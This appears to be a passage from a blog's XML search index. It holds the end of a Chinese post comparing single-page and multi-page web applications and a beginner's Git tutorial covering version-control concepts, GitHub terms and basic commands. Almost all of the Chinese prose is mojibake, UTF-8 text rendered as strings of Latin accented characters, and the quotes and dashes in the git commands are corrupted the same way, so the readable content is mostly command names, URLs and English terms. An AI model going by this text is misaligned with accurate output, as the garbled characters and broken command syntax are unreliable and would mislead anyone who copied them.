2ï¼Œå¯¼èˆªä¸å¯ç”¨ï¼Œå¦‚æžœä¸€å®šè¦å¯¼èˆªéœ€è¦è‡ªè¡Œå®žçŽ°å‰è¿›ã€åŽé€€ã€‚ï¼ˆç”±äºŽæ˜¯å•é¡µé¢ä¸èƒ½ç”¨æµè§ˆå™¨çš„å‰è¿›åŽé€€åŠŸèƒ½ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±å»ºç«‹å †æ ˆç®¡ç†ï¼‰ 3ï¼Œåˆæ¬¡åŠ è½½æ—¶è€—æ—¶å¤š 4ï¼Œé¡µé¢å¤æ‚åº¦æé«˜å¾ˆå¤š ä½¿ç”¨SPAé™ä½Žå“åº”æ—¶é—´å’Œç¡¬ä»¶æˆæœ¬å•é¡µé¢APPå°è¯•è§£å†³æ€§èƒ½å·®å’Œæé«˜è½¬æ¢çŽ‡çš„é—®é¢˜ã€‚ä»–ä»¬å¯ä»¥å¤§å¹…èŠ‚çœç¡¬ä»¶æˆæœ¬ç­‰ç­‰ã€‚è®©æˆ‘ä»¬æ¥è°ƒæŸ¥SPAå¯å¸¦æ¥çš„æ‰€æœ‰å¥½å¤„ã€‚ é€Ÿåº¦å’Œå“åº”é€Ÿåº¦å¯¹äºŽå•é¡µé¢APPï¼ŒæœåŠ¡å™¨æ— éœ€åœ¨æ¯æ¬¡äº¤äº’æ—¶é‡æ–°åŠ è½½å¤§å¤šæ•°èµ„æºï¼Œä¾‹å¦‚HTMLï¼ŒCSSå’Œè„šæœ¬ã€‚è¿™äº›æ–‡ä»¶åªéœ€è¦åˆå§‹åŠ è½½ã€‚ä¹‹åŽï¼Œåªæœ‰æ–°çš„æ•°æ®ä»ŽæœåŠ¡å™¨ä¸Šä¸‹è½½ã€‚æ­¤å¤–ï¼ŒSPAä»…é‡æ–°åŠ è½½éƒ¨åˆ†å†…å®¹ï¼Œå› æ­¤å®ƒä»¬çš„æœåŠ¡å™¨è´Ÿè½½è¾ƒè½»ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¿™äº›APPå…è®¸åœ¨APPä¸­è¿›è¡Œå¿«é€Ÿäº¤äº’ ç”±äºŽå°†æ•°æ®å¤„ç†ä»ŽæœåŠ¡å™¨ç§»åŠ¨åˆ°æµè§ˆå™¨ï¼ŒSPAè¿˜ç¼©çŸ­äº†å“åº”æ—¶é—´ã€‚ é€‚åº”æ€§åœ¨å¼€å‘ç§»åŠ¨APPæ—¶ï¼ŒSPAä¸ºæ‚¨å¸¦æ¥äº†ç›¸å½“å¤§çš„å®‰æ…°ï¼šæ‚¨å¯ä»¥ä¸ºç§»åŠ¨APPé‡æ–°ä½¿ç”¨åŸºäºŽWebçš„APPçš„ç›¸åŒåŽç«¯ä»£ç ã€‚è¿™å¯¹äºŽå¤šé¡µé¢APPæ¥è¯´éžå¸¸å›°éš¾ã€‚æ­¤å¤–ï¼Œä¸Žç½‘ç«™ç›¸æ¯”ï¼ŒSPAæ›´åƒæ˜¯APPï¼Œå› æ­¤æ‚¨æ— éœ€ä¸“é—¨é’ˆå¯¹ç§»åŠ¨è®¾å¤‡çš„SPAè®¾è®¡æˆ–åŠŸèƒ½è¿›è¡Œè°ƒæ•´ã€‚ çµæ´»çš„UIé™¤äº†ä¸€äº›é™æ€èµ„æºæ–‡ä»¶å¤–ï¼Œæ‚¨å¯ä»¥å®Œå…¨é‡å†™å•é¡µAPPçš„å‰ç«¯ï¼Œè€Œä¸ä¼šå½±å“æœåŠ¡å™¨ã€‚ è„±æœºæ”¯æŒå’Œç¼“å­˜å•é¡µé¢APPå¯ä»¥ç¼“å­˜åˆ°ä»»ä½•å…·æœ‰åˆ†æ´¾çš„æœ¬åœ°å­˜å‚¨ã€‚è¿™ç§ç±»åž‹çš„APPå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œç„¶åŽå­˜å‚¨å®ƒæ”¶åˆ°çš„æ‰€æœ‰æ•°æ®ã€‚APPå¯ä»¥ä½¿ç”¨è¿™äº›æ•°æ®ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå³ä½¿æ‚¨çš„è®¾å¤‡å¤±åŽ»è¿žæŽ¥æ€§ï¼ŒSPAä¹Ÿå¯ä»¥åœ¨ç¦»çº¿çŠ¶æ€ä¸‹è¿è¡Œï¼Œä¸ŽMPAä¸åŒï¼Œæ‰€ä»¥æ‚¨å¯ä»¥ç»§ç»­ä½¿ç”¨å®ƒã€‚åªè¦è¿žæŽ¥è¿”å›žï¼Œæœ¬åœ°æ•°æ®å°±ä¼šä¸ŽæœåŠ¡å™¨åŒæ­¥ã€‚ èƒ½å¤Ÿåˆ†ç¦»æ•°æ®å’ŒUIå•é¡µé¢APPèƒ½å¤ŸåŒºåˆ†æ•°æ®å’Œç”¨æˆ·ç•Œé¢ã€‚è¿™åœ¨å¼€å‘WebAPPæ—¶å¯ä»¥ç›¸å½“æœ‰åŠ©äºŽç®€åŒ–æµ‹è¯•ã€‚æ­¤å¤–ï¼Œè¿™æ ·çš„åŒºåˆ«å…è®¸æ‚¨å¤„ç†æœªæ¥çš„æ‰€æœ‰é›†æˆå’Œå¯èƒ½çš„æ•°æ®å¦‚ä½•è¿›å…¥SPAæ¡†æž¶çš„å˜åŒ–ï¼Œå¹¶è½¬åˆ°å…¶ä»–ç³»ç»Ÿï¼Œè€Œä¸ä¼šå¯¹æŽ¥å£äº§ç”Ÿé‡å¤§å½±å“ã€‚ - å•é¡µé¢åº”ç”¨ï¼ˆSinglePage Web Applicationï¼ŒSPAï¼‰ å¤šé¡µé¢åº”ç”¨ï¼ˆMultiPage Applicationï¼ŒMPAï¼‰ ç»„æˆ ä¸€ä¸ªå¤–å£³é¡µé¢å’Œå¤šä¸ªé¡µé¢ç‰‡æ®µç»„æˆ å¤šä¸ªå®Œæ•´é¡µé¢æž„æˆ èµ„æºå…±ç”¨(css,js) å…±ç”¨ï¼Œåªéœ€åœ¨å¤–å£³éƒ¨åˆ†åŠ è½½ ä¸å…±ç”¨ï¼Œæ¯ä¸ªé¡µé¢éƒ½éœ€è¦åŠ è½½ åˆ·æ–°æ–¹å¼ é¡µé¢å±€éƒ¨åˆ·æ–°æˆ–æ›´æ”¹ æ•´é¡µåˆ·æ–° url æ¨¡å¼ a.com/#/pageone a.com/#/pagetwo a.com/pageone.html a.com/pagetwo.html ç”¨æˆ·ä½“éªŒ é¡µé¢ç‰‡æ®µé—´çš„åˆ‡æ¢å¿«ï¼Œç”¨æˆ·ä½“éªŒè‰¯å¥½ é¡µé¢åˆ‡æ¢åŠ è½½ç¼“æ…¢ï¼Œæµç•…åº¦ä¸å¤Ÿï¼Œç”¨æˆ·ä½“éªŒæ¯”è¾ƒå·® è½¬åœºåŠ¨ç”» å®¹æ˜“å®žçŽ° æ— æ³•å®žçŽ° æ•°æ®ä¼ é€’ å®¹æ˜“ ä¾èµ– urlä¼ å‚ã€æˆ–è€…cookie ã€localStorageç­‰ æœç´¢å¼•æ“Žä¼˜åŒ–(SEO) éœ€è¦å•ç‹¬æ–¹æ¡ˆã€å®žçŽ°è¾ƒä¸ºå›°éš¾ã€ä¸åˆ©äºŽSEOæ£€ç´¢ å¯åˆ©ç”¨æœåŠ¡å™¨ç«¯æ¸²æŸ“(SSR)ä¼˜åŒ–å®žçŽ°æ–¹æ³•ç®€æ˜“ è¯•ç”¨èŒƒå›´ é«˜è¦æ±‚çš„ä½“éªŒåº¦ã€è¿½æ±‚ç•Œé¢æµç•…çš„åº”ç”¨ é€‚ç”¨äºŽè¿½æ±‚é«˜åº¦æ”¯æŒæœç´¢å¼•æ“Žçš„åº”ç”¨ å¼€å‘æˆæœ¬ è¾ƒé«˜ï¼Œå¸¸éœ€å€ŸåŠ©ä¸“ä¸šçš„æ¡†æž¶ è¾ƒä½Ž ï¼Œä½†é¡µé¢é‡å¤ä»£ç å¤š ç»´æŠ¤æˆæœ¬ ç›¸å¯¹å®¹æ˜“ ç›¸å¯¹å¤æ‚ http://blog.sina.com.cn/s/blog_18186755f0102xiyt.html https://juejin.im/post/5a0ea4ec6fb9a0450407725c]]></content>
  </entry>
  <entry>
    <title><![CDATA[Gitå…¥é—¨]]></title>
    <url>%2F2017%2F12%2F16%2Fgit%2F</url>
    <content type="text"><![CDATA[å‰è¨€ç®€å•è®°å½•Gitç”¨æ³•ä»¥åšè®°å½• å…³äºŽç‰ˆæœ¬æŽ§åˆ¶ç‰ˆæœ¬æŽ§åˆ¶æ˜¯ä¸€ç§è®°å½•ä¸€ä¸ªæˆ–è‹¥å¹²æ–‡ä»¶å†…å®¹å˜åŒ–ï¼Œä»¥ä¾¿å°†æ¥æŸ¥é˜…ç‰¹å®šç‰ˆæœ¬ä¿®è®¢æƒ…å†µçš„ç³»ç»Ÿã€‚ æœ¬åœ°ç‰ˆæœ¬æŽ§åˆ¶ç³»ç»Ÿæ–‡ä»¶å¤¹å¤‡ä»½æ³•ã€‚å¤åˆ¶æ•´ä¸ªé¡¹ç›®ç›®å½•æ¥ä¿å­˜ä¸åŒçš„ç‰ˆæœ¬ï¼Œæˆ–è®¸è¿˜ä¼šæ”¹ååŠ ä¸Šå¤‡ä»½æ—¶é—´ä»¥ç¤ºåŒºåˆ«ã€‚ å…¶ä¸­æœ€æµè¡Œçš„ä¸€ç§å«åš RCSï¼ŒçŽ°ä»Šè®¸å¤šè®¡ç®—æœºç³»ç»Ÿä¸Šéƒ½è¿˜çœ‹å¾—åˆ°å®ƒçš„è¸ªå½±ã€‚ ç”šè‡³åœ¨æµè¡Œçš„ Mac OS X ç³»ç»Ÿä¸Šå®‰è£…äº†å¼€å‘è€…å·¥å…·åŒ…ä¹‹åŽï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ rcs å‘½ä»¤ã€‚ å®ƒçš„å·¥ä½œåŽŸç†æ˜¯åœ¨ç¡¬ç›˜ä¸Šä¿å­˜è¡¥ä¸é›†ï¼ˆè¡¥ä¸æ˜¯æŒ‡æ–‡ä»¶ä¿®è®¢å‰åŽçš„å˜åŒ–ï¼‰ï¼›é€šè¿‡åº”ç”¨æ‰€æœ‰çš„è¡¥ä¸ï¼Œå¯ä»¥é‡æ–°è®¡ç®—å‡ºå„ä¸ªç‰ˆæœ¬çš„æ–‡ä»¶å†…å®¹ã€‚ é›†ä¸­åŒ–çš„ç‰ˆæœ¬æŽ§åˆ¶ç³»ç»Ÿï¼ˆCentralized Version Control Systemsï¼‰ä½¿ç”¨ä¸€ä¸ªå•ä¸€çš„é›†ä¸­ç®¡ç†çš„æœåŠ¡å™¨ï¼Œä¿å­˜æ‰€æœ‰æ–‡ä»¶çš„ä¿®è®¢ç‰ˆæœ¬ï¼Œè€ŒååŒå·¥ä½œçš„äººä»¬éƒ½é€šè¿‡å®¢æˆ·ç«¯è¿žåˆ°è¿™å°æœåŠ¡å™¨ï¼Œå–å‡ºæœ€æ–°çš„æ–‡ä»¶æˆ–è€…æäº¤æ›´æ–°ã€‚ è¿™ç±»ç³»ç»Ÿï¼Œå¸¸è§çš„æœ‰ CVSã€Subversion ä»¥åŠ Perforce ç­‰ï¼Œä¼˜ç‚¹æ˜¯æœ‰å®Œå–„çš„æƒé™ç³»ç»Ÿï¼Œä»¥åŠç»Ÿä¸€çš„æœåŠ¡ç«¯ï¼Œé€‚åˆå•†ä¸šè½¯ä»¶çš„å¼€å‘ã€‚ç¼ºç‚¹æ˜¯å¦‚æžœå‡ºçŽ°ä¸­å¤®æœåŠ¡å™¨çš„å•ç‚¹æ•…éšœï¼Œä¼šæœ‰æ‰€æœ‰äººæ— æ³•å·¥ä½œç”šè‡³ä¸¢å¤±æ–‡ä»¶çš„é£Žé™©ã€‚ åˆ†å¸ƒå¼ç‰ˆæœ¬æŽ§åˆ¶ç³»ç»Ÿ(Distributed Version Control System)å®¢æˆ·ç«¯å¹¶ä¸åªæå–æœ€æ–°ç‰ˆæœ¬çš„æ–‡ä»¶å¿«ç…§ï¼Œè€Œæ˜¯æŠŠä»£ç ä»“åº“å®Œæ•´åœ°é•œåƒä¸‹æ¥ã€‚ è¿™ä¹ˆä¸€æ¥ï¼Œä»»ä½•ä¸€å¤„ååŒå·¥ä½œç”¨çš„æœåŠ¡å™¨å‘ç”Ÿæ•…éšœï¼Œäº‹åŽéƒ½å¯ä»¥ç”¨ä»»ä½•ä¸€ä¸ªé•œåƒå‡ºæ¥çš„æœ¬åœ°ä»“åº“æ¢å¤ã€‚ å› ä¸ºæ¯ä¸€æ¬¡çš„å…‹éš†æ“ä½œï¼Œå®žé™…ä¸Šéƒ½æ˜¯ä¸€æ¬¡å¯¹ä»£ç ä»“åº“çš„å®Œæ•´å¤‡ä»½ã€‚ åœ¨è¿™ç±»ç³»ç»Ÿä¸­ï¼Œåƒ Gitã€Mercurialã€Bazaarã€BitKeeper ä»¥åŠ Darcs ç­‰ï¼Œå®ƒä»¬ç›¸å½“äºŽæŠŠé›†ä¸­å¼ç‰ˆæœ¬æŽ§åˆ¶ç³»ç»Ÿçš„æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½äº¤ç»™å‚ä¸Žå¼€å‘çš„å®¢æˆ·ç«¯æ¥ä¿ç®¡ï¼Œåªæœ‰éœ€è¦ä¸åŒå¼€å‘è€…åˆå¹¶ä»£ç æ—¶ï¼Œæ‰éœ€è¦ä¸€ä¸ªä¸­è½¬ç«™æ¥å®Œæˆã€‚ é›†æˆç®¡ç†è€…å·¥ä½œæµGit å…è®¸å¤šä¸ªè¿œç¨‹ä»“åº“å­˜åœ¨ï¼Œä½¿å¾—è¿™æ ·ä¸€ç§å·¥ä½œæµæˆä¸ºå¯èƒ½ï¼šæ¯ä¸ªå¼€å‘è€…æ‹¥æœ‰è‡ªå·±ä»“åº“çš„å†™æƒé™å’Œå…¶ä»–æ‰€æœ‰äººä»“åº“çš„è¯»æƒé™ã€‚ è¿™ç§æƒ…å½¢ä¸‹é€šå¸¸ä¼šæœ‰ä¸ªä»£è¡¨`â€˜å®˜æ–¹â€™â€™é¡¹ç›®çš„æƒå¨çš„ä»“åº“ã€‚ è¦ä¸ºè¿™ä¸ªé¡¹ç›®åšè´¡çŒ®ï¼Œä½ éœ€è¦ä»Žè¯¥é¡¹ç›®å…‹éš†å‡ºä¸€ä¸ªè‡ªå·±çš„å…¬å¼€ä»“åº“ï¼Œç„¶åŽå°†è‡ªå·±çš„ä¿®æ”¹æŽ¨é€ä¸ŠåŽ»ã€‚ æŽ¥ç€ä½ å¯ä»¥è¯·æ±‚å®˜æ–¹ä»“åº“çš„ç»´æŠ¤è€…æ‹‰å–æ›´æ–°åˆå¹¶åˆ°ä¸»é¡¹ç›®ã€‚ ç»´æŠ¤è€…å¯ä»¥å°†ä½ çš„ä»“åº“ä½œä¸ºè¿œç¨‹ä»“åº“æ·»åŠ è¿›æ¥ï¼Œåœ¨æœ¬åœ°æµ‹è¯•ä½ çš„å˜æ›´ï¼Œå°†å…¶åˆå¹¶å…¥ä»–ä»¬çš„åˆ†æ”¯å¹¶æŽ¨é€å›žå®˜æ–¹ä»“åº“ã€‚ è¿™ä¸€æµç¨‹çš„å·¥ä½œæ–¹å¼å¦‚ä¸‹æ‰€ç¤º é¡¹ç›®ç»´æŠ¤è€…æŽ¨é€åˆ°ä¸»ä»“åº“ã€‚ è´¡çŒ®è€…å…‹éš†æ­¤ä»“åº“ï¼Œåšå‡ºä¿®æ”¹ã€‚ è´¡çŒ®è€…å°†æ•°æ®æŽ¨é€åˆ°è‡ªå·±çš„å…¬å¼€ä»“åº“ã€‚ è´¡çŒ®è€…ç»™ç»´æŠ¤è€…å‘é€é‚®ä»¶ï¼Œè¯·æ±‚æ‹‰å–è‡ªå·±çš„æ›´æ–°ã€‚ ç»´æŠ¤è€…åœ¨è‡ªå·±æœ¬åœ°çš„ä»“åº“ä¸­ï¼Œå°†è´¡çŒ®è€…çš„ä»“åº“åŠ ä¸ºè¿œç¨‹ä»“åº“å¹¶åˆå¹¶ä¿®æ”¹ã€‚ ç»´æŠ¤è€…å°†åˆå¹¶åŽçš„ä¿®æ”¹æŽ¨é€åˆ°ä¸»ä»“åº“ã€‚ ä»€ä¹ˆæ˜¯GitGitæ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€å…ˆè¿›çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æŽ§åˆ¶ç³»ç»Ÿã€‚æœ€åˆç”±Linus Torvaldsç¼–å†™ï¼Œç”¨ä½œLinuxå†…æ ¸ä»£ç çš„ç®¡ç†ã€‚ ç›´æŽ¥è®°å½•å¿«ç…§ï¼Œè€Œéžå·®å¼‚æ¯”è¾ƒ Git å¯¹å¾…æ•°æ®æ›´åƒæ˜¯ä¸€ä¸ª å¿«ç…§æµã€‚è¿™æ˜¯ Git ä¸Žå‡ ä¹Žæ‰€æœ‰å…¶å®ƒç‰ˆæœ¬æŽ§åˆ¶ç³»ç»Ÿçš„é‡è¦åŒºåˆ«ã€‚ è¿‘ä¹Žæ‰€æœ‰æ“ä½œéƒ½æ˜¯æœ¬åœ°æ‰§è¡Œ Git ä¿è¯å®Œæ•´æ€§ Git ä¸­æ‰€æœ‰æ•°æ®åœ¨å­˜å‚¨å‰éƒ½è®¡ç®—æ ¡éªŒå’Œï¼Œç„¶åŽä»¥æ ¡éªŒå’Œæ¥å¼•ç”¨ã€‚ è¿™æ„å‘³ç€ä¸å¯èƒ½åœ¨ Git ä¸çŸ¥æƒ…æ—¶æ›´æ”¹ä»»ä½•æ–‡ä»¶å†…å®¹æˆ–ç›®å½•å†…å®¹ã€‚ è¿™ä¸ªåŠŸèƒ½å»ºæž„åœ¨ Git åº•å±‚ï¼Œæ˜¯æž„æˆ Git å“²å­¦ä¸å¯æˆ–ç¼ºçš„éƒ¨åˆ†ã€‚ è‹¥ä½ åœ¨ä¼ é€è¿‡ç¨‹ä¸­ä¸¢å¤±ä¿¡æ¯æˆ–æŸåæ–‡ä»¶ï¼ŒGit å°±èƒ½å‘çŽ°ã€‚Git ç”¨ä»¥è®¡ç®—æ ¡éªŒå’Œçš„æœºåˆ¶å«åš SHA-1 æ•£åˆ—ï¼ˆhashï¼Œå“ˆå¸Œï¼‰ã€‚ è¿™æ˜¯ä¸€ä¸ªç”± 40 ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ï¼ˆ0-9 å’Œ a-fï¼‰ç»„æˆå­—ç¬¦ä¸²ï¼ŒåŸºäºŽ Git ä¸­æ–‡ä»¶çš„å†…å®¹æˆ–ç›®å½•ç»“æž„è®¡ç®—å‡ºæ¥ã€‚ SHA-1 å“ˆå¸Œçœ‹èµ·æ¥æ˜¯è¿™æ ·ï¼š 24b9da6552252987aa493b52f8696cd6d3b00373 Git ä¸­ä½¿ç”¨è¿™ç§å“ˆå¸Œå€¼çš„æƒ…å†µå¾ˆå¤šï¼Œä½ å°†ç»å¸¸çœ‹åˆ°è¿™ç§å“ˆå¸Œå€¼ã€‚ å®žé™…ä¸Šï¼ŒGit æ•°æ®åº“ä¸­ä¿å­˜çš„ä¿¡æ¯éƒ½æ˜¯ä»¥æ–‡ä»¶å†…å®¹çš„å“ˆå¸Œå€¼æ¥ç´¢å¼•ï¼Œè€Œä¸æ˜¯æ–‡ä»¶åã€‚ Git ä¸€èˆ¬åªæ·»åŠ æ•°æ® æ‰€æœ‰Git æ“ä½œï¼Œå‡ ä¹Žåªå¾€ Git æ•°æ®åº“ä¸­å¢žåŠ æ•°æ®ã€‚ä»¥åˆ é™¤æ•°æ®ä¸ºä¾‹ï¼Œåˆ é™¤ä¸€ä¸ªæ–‡ä»¶åªä¼šæ˜¯è¿™æ¬¡æäº¤çš„ç‰ˆæœ¬ä¸­æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶çš„å¿«ç…§ï¼Œä¸ä¼šåˆ é™¤å‰å‡ ä¸ªç‰ˆæœ¬ä¸­çš„è¿™ä¸ªæ–‡ä»¶ã€‚ ä¸‰ç§çŠ¶æ€ å·²æäº¤ï¼ˆcommittedï¼‰ã€å·²ä¿®æ”¹ï¼ˆmodifiedï¼‰å’Œå·²æš‚å­˜ï¼ˆstagedï¼‰ ä»€ä¹ˆæ˜¯githubgithubæ˜¯ä¸€ä¸ªç”¨gitåšç‰ˆæœ¬æŽ§åˆ¶ç³»ç»Ÿçš„é¡¹ç›®æ‰˜ç®¡å¹³å°ã€‚ githubä¸Šå¸¸è§ç”¨è¯­ Version Controlï¼ˆç‰ˆæœ¬æŽ§åˆ¶ï¼‰: ä»»ä½•ä¸€ä¸ªèƒ½å¤Ÿè®©ä½ äº†è§£æ–‡ä»¶çš„åŽ†å²ï¼Œä»¥åŠè¯¥æ–‡ä»¶çš„å‘å±•è¿›ç¨‹çš„ç³»ç»Ÿã€‚ Gitï¼šä¸€ä¸ªç‰ˆæœ¬æŽ§åˆ¶ç¨‹åºï¼Œé€šè¿‡å¯¹å˜æ›´è¿›è¡Œæ³¨é‡Šï¼Œä»¥åˆ›å»ºä¸€ä¸ªæ˜“äºŽéåŽ†çš„ç³»ç»ŸåŽ†å²ã€‚Commitï¼ˆæäº¤ï¼‰ï¼šåœ¨æŒ‡å®šæ—¶é—´ç‚¹å¯¹ç³»ç»Ÿå·®å¼‚è¿›è¡Œçš„æ³¨é‡Š â€œå¿«ç…§â€ã€‚ Localï¼ˆæœ¬åœ°ï¼‰ï¼šæŒ‡ä»»æ„æ—¶åˆ»å·¥ä½œæ—¶æ­£åœ¨ä½¿ç”¨çš„ç”µè„‘ã€‚ Remoteï¼ˆè¿œç¨‹ï¼‰ï¼š æŒ‡æŸä¸ªè”ç½‘çš„ä½ç½®ã€‚ Repository (ä»“åº“ï¼Œç®€ç§° repo)ï¼šé…ç½®äº†Gitè¶…çº§æƒé™çš„ç‰¹å®šæ–‡ä»¶å¤¹ï¼ŒåŒ…å«äº†ä½ çš„é¡¹ç›®æˆ–ç³»ç»Ÿç›¸å…³çš„æ‰€æœ‰æ–‡ä»¶ã€‚ Githubï¼šèŽ·å–æœ¬åœ°æäº¤åŽ†å²è®°å½•ï¼Œå¹¶è¿›è¡Œè¿œç¨‹å­˜å‚¨ï¼Œä»¥ä¾¿ä½ å¯ä»¥ä»Žä»»ä½•è®¡ç®—æœºè®¿é—®è¿™äº›è®°å½•ã€‚ Pushingï¼ˆæŽ¨é€ï¼‰ï¼šå–å¾—æœ¬åœ°Gitæäº¤ï¼ˆä»¥åŠç›¸å…³çš„æ‰€æœ‰å·¥ä½œï¼‰ï¼Œç„¶åŽå°†å…¶ä¸Šä¼ åˆ°åœ¨çº¿Githubã€‚ Pullingï¼ˆæ‹‰å–ï¼‰ï¼šä»Žåœ¨çº¿çš„Githubä¸ŠèŽ·å–æœ€æ–°çš„æäº¤è®°å½•ï¼Œç„¶åŽåˆå¹¶åˆ°æœ¬åœ°ç”µè„‘ä¸Šã€‚ Master (branch)ï¼šä¸»åˆ†æ”¯ï¼Œæäº¤åŽ†å² â€œæ ‘â€çš„ â€œæ ‘å¹²â€ï¼ŒåŒ…å«æ‰€æœ‰å·²å®¡æ ¸çš„å†…å®¹/ä»£ç ã€‚ Feature branchï¼ˆåŠŸèƒ½åˆ†æ”¯/ç‰¹æ€§åˆ†æ”¯ï¼‰ï¼šä¸€ä¸ªåŸºäºŽä¸»åˆ†æ”¯çš„ç‹¬ç«‹çš„ä½ç½®ï¼Œåœ¨å†æ¬¡å¹¶å…¥åˆ°ä¸»åˆ†æ”¯ä¹‹å‰ï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œå®‰å…¨åœ°å†™å·¥ä½œä¸­çš„æ–°ä»»åŠ¡ã€‚ Pull Requestï¼ˆå‘å¸ƒè¯·æ±‚ï¼‰ï¼šä¸€ä¸ª Github å·¥å…·ï¼Œå…è®¸ç”¨æˆ·è½»æ¾åœ°æŸ¥çœ‹æŸåŠŸèƒ½åˆ†æ”¯çš„æ›´æ”¹ ï¼ˆthe differenceæˆ– â€œdiffâ€ï¼‰ï¼ŒåŒæ—¶å…è®¸ç”¨æˆ·åœ¨è¯¥åˆ†æ”¯åˆå¹¶åˆ°ä¸»åˆ†æ”¯ä¹‹å‰å¯¹å…¶è¿›è¡Œè®¨è®ºå’Œè°ƒæ•´ã€‚ Mergingï¼ˆåˆå¹¶ï¼‰ï¼šè¯¥æ“ä½œæŒ‡èŽ·å–åŠŸèƒ½åˆ†æ”¯çš„æäº¤ï¼ŒåŠ å…¥åˆ°ä¸»åˆ†æ”¯æäº¤åŽ†å²çš„é¡¶éƒ¨ã€‚ Checking outï¼ˆåˆ‡æ¢ï¼‰ï¼šè¯¥æ“ä½œæŒ‡ä»Žä¸€ä¸ªåˆ†æ”¯åˆ‡æ¢åˆ°å¦ä¸€ä¸ªåˆ†æ”¯ã€‚ ä¸€ã€åŸºæœ¬æ“ä½œ1.è®¾ç½®ç”¨æˆ·ä¿¡æ¯ $ git config â€“global user.name â€œç”¨æˆ·åâ€ $ git config â€“global user.email â€œç”¨æˆ·é‚®ç®±â€ å½“å®‰è£…å®Œ Git åº”è¯¥åšçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯è®¾ç½®ä½ çš„ç”¨æˆ·åç§°ä¸Žé‚®ä»¶åœ°å€ã€‚ è¿™æ ·åšå¾ˆé‡è¦ï¼Œå› ä¸ºæ¯ä¸€ä¸ª Git çš„æäº¤éƒ½ä¼šä½¿ç”¨è¿™äº›ä¿¡æ¯ï¼Œå¹¶ä¸”å®ƒä¼šå†™å…¥åˆ°ä½ çš„æ¯ä¸€æ¬¡æäº¤ä¸­ï¼Œä¸å¯æ›´æ”¹ï¼š å†æ¬¡å¼ºè°ƒï¼Œå¦‚æžœä½¿ç”¨äº† â€“global é€‰é¡¹ï¼Œé‚£ä¹ˆè¯¥å‘½ä»¤åªéœ€è¦è¿è¡Œä¸€æ¬¡ï¼Œå› ä¸ºä¹‹åŽæ— è®ºä½ åœ¨è¯¥ç³»ç»Ÿä¸Šåšä»»ä½•äº‹æƒ…ï¼Œ Git éƒ½ä¼šä½¿ç”¨é‚£äº›ä¿¡æ¯ã€‚ å½“ä½ æƒ³é’ˆå¯¹ç‰¹å®šé¡¹ç›®ä½¿ç”¨ä¸åŒçš„ç”¨æˆ·åç§°ä¸Žé‚®ä»¶åœ°å€æ—¶ï¼Œå¯ä»¥åœ¨é‚£ä¸ªé¡¹ç›®ç›®å½•ä¸‹è¿è¡Œæ²¡æœ‰ â€“global é€‰é¡¹çš„å‘½ä»¤æ¥é…ç½®ã€‚ å¾ˆå¤š GUI å·¥å…·éƒ½ä¼šåœ¨ç¬¬ä¸€æ¬¡è¿è¡Œæ—¶å¸®åŠ©ä½ é…ç½®è¿™äº›ä¿¡æ¯ã€‚ æ£€æŸ¥é…ç½®ä¿¡æ¯å¦‚æžœæƒ³è¦æ£€æŸ¥ä½ çš„é…ç½®ï¼Œå¯ä»¥ä½¿ç”¨ git config â€“list å‘½ä»¤æ¥åˆ—å‡ºæ‰€æœ‰ Git å½“æ—¶èƒ½æ‰¾åˆ°çš„é…ç½®ã€‚ $ git config â€“listuser.name=John Doeuser.email=johndoe@example.comcolor.status=autocolor.branch=autocolor.interactive=autocolor.diff=autoâ€¦ ä½ å¯èƒ½ä¼šçœ‹åˆ°é‡å¤çš„å˜é‡åï¼Œå› ä¸º Git ä¼šä»Žä¸åŒçš„æ–‡ä»¶ä¸­è¯»å–åŒä¸€ä¸ªé…ç½®ï¼ˆä¾‹å¦‚ï¼š/etc/gitconfig ä¸Ž ~/.gitconfigï¼‰ã€‚ è¿™ç§æƒ…å†µä¸‹ï¼ŒGit ä¼šä½¿ç”¨å®ƒæ‰¾åˆ°çš„æ¯ä¸€ä¸ªå˜é‡çš„æœ€åŽä¸€ä¸ªé…ç½®ã€‚ ä½ å¯ä»¥é€šè¿‡è¾“å…¥ git config ï¼š æ¥æ£€æŸ¥ Git çš„æŸä¸€é¡¹é…ç½® $ git config user.nameJohn Doe 2.å»ºåº“ $ git init 3.æäº¤ $ git add æ–‡ä»¶å æ–‡ä»¶å æ–‡ä»¶å â€”&gt;ä»Žå·¥ä½œåŒºæäº¤æ–‡ä»¶åˆ°æš‚å­˜åŒº $ git commit -m â€œæ›´æ”¹è¯´æ˜Žâ€ â€”&gt;ä»Žæš‚å­˜åŒºæäº¤ä¿®æ”¹åˆ°ç‰ˆæœ¬åº“ 4.æŸ¥çœ‹ $ git status â€”&gt;æŸ¥çœ‹ä»“åº“çŠ¶æ€ $ git diff æ–‡ä»¶å â€”&gt;æŸ¥çœ‹ä¿®æ”¹å†…å®¹ $ git log â€”&gt;æŸ¥çœ‹æäº¤æ—¥å¿— æŸ¥çœ‹æ—¥å¿—å…·ä½“ä¿¡æ¯[https://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-%E6%9F%A5%E7%9C%8B%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2] $ git reflog â€”&gt;æŸ¥çœ‹å‘½ä»¤æ—¥å¿— 5.å›žé€€ $ git reset â€“hard HEAD^ â€”&gt;å›žåˆ°ä¸Šæ¬¡ä¿®æ”¹ $ git reset â€“hard commit_id â€”&gt;å›žåˆ°ä»»æ„ç‰ˆæœ¬(æäº¤ç å–å‰é¢7ä½å°±å¤Ÿäº†) 6.æ’¤é”€ $ git checkout â€“æ–‡ä»¶å â€”&gt;æŠŠç‰ˆæœ¬åº“ä¸­çš„æ–‡ä»¶æ›¿æ¢å½“å‰æ–‡ä»¶ï¼Œæ’¤é”€æ‰€æœ‰æœªaddä¿®æ”¹ $ git reset HEAD æ–‡ä»¶å â€”&gt;æŠŠä¸Šä¸€æ¬¡addæ’¤é”€ 7.åˆ é™¤ $ git rm æ–‡ä»¶å 